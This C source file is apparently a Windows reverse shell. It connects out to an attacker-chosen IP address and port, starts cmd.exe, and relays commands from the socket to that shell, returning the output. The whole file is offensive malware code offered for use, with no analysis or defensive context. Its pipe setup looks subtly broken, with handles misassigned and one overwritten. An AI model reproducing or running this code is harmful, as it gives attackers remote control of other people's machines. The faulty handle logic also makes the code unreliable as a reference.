#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

void execute_reverse_shell(SOCKET socket) {
    char buffer[1024];
    int recv_size;

    HANDLE hStdIn, hStdOut, hStdErr;
    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hStdIn, &hStdOut, &sa, 0) || !CreatePipe(&hStdIn, &hStdErr, &sa, 0)) {
        const char *error_message = "Failed to create pipes\n";
        send(socket, error_message, strlen(error_message), 0);
        return;
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    si.hStdInput = hStdIn;
    si.hStdOutput = hStdOut;
    si.hStdError = hStdErr;
    si.dwFlags = STARTF_USESTDHANDLES;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        const char *error_message = "Failed to execute reverse shell\n";
        send(socket, error_message, strlen(error_message), 0);
        return;
    }

    while ((recv_size = recv(socket, buffer, sizeof(buffer), 0)) > 0) {
        DWORD bytes_written;
        WriteFile(hStdIn, buffer, recv_size, &bytes_written, NULL);
        DWORD bytes_read;
        if (ReadFile(hStdOut, buffer, sizeof(buffer), &bytes_read, NULL)) {
            send(socket, buffer, bytes_read, 0);
        }
        if (ReadFile(hStdErr, buffer, sizeof(buffer), &bytes_read, NULL)) {
            send(socket, buffer, bytes_read, 0);
        }
    }

    CloseHandle(hStdIn);
    CloseHandle(hStdOut);
    CloseHandle(hStdErr);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main() {
    WSADATA wsaData;
    SOCKET socket_desc;
    struct sockaddr_in server;
    char *ip = " "; 
    int port = 69;

    /* struct hostent *he = gethostbyname(ip); // in case you need to resolve address
    if (he == NULL) {
        printf("Failed to resolve hostname: %s\n", ip);
        return 1;
    }*/

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed. Error Code: %d\n", WSAGetLastError());
        return 1;
    }

    socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_desc == INVALID_SOCKET) {
        printf("Socket creation failed. Error Code: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // memcpy(&server.sin_addr.s_addr, he->h_addr_list[0], he->h_length); // in case u need to resolve address
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (connect(socket_desc, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed. Error Code: %d\n", WSAGetLastError());
        closesocket(socket_desc);
        WSACleanup();
        return 1;
    }

    execute_reverse_shell(socket_desc);
    closesocket(socket_desc);
    WSACleanup();
    return 0;
}
